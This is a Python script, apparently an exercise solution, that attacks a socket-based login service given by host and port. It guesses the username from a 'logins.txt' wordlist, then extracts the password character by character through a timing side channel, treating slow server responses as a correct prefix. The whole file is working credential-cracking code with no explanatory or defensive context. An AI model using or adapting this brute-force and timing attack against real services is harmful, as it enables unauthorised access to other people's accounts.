import sys
import socket
import string
import json
import time


def find_login(client_socket, message):
    with open("logins.txt") as logins_file:
        for login in logins_file:
            message["login"] = login.strip()
            client_socket.send(json.dumps(message).encode())
            response = json.loads(client_socket.recv(1024).decode())
            if response["result"] == "Wrong password!":
                return


def find_password(client_socket, message):
    chars = string.ascii_letters + string.digits
    while True:
        for char in chars:
            message["password"] += char
            start_time = time.perf_counter()
            client_socket.send(json.dumps(message).encode())
            response = json.loads(client_socket.recv(1024).decode())
            total_time = time.perf_counter() - start_time
            if total_time >= 0.1:
                break
            elif response["result"] == "Wrong password!":
                message["password"] = message["password"][:-1]
            elif response["result"] == "Connection success!":
                return


def main():
    args = sys.argv
    message = {"login": "", "password": ""}
    with socket.socket() as client_socket:
        client_socket.connect((args[1], int(args[2])))
        find_login(client_socket, message)
        find_password(client_socket, message)
    print(json.dumps(message))


if __name__ == "__main__":
    main()
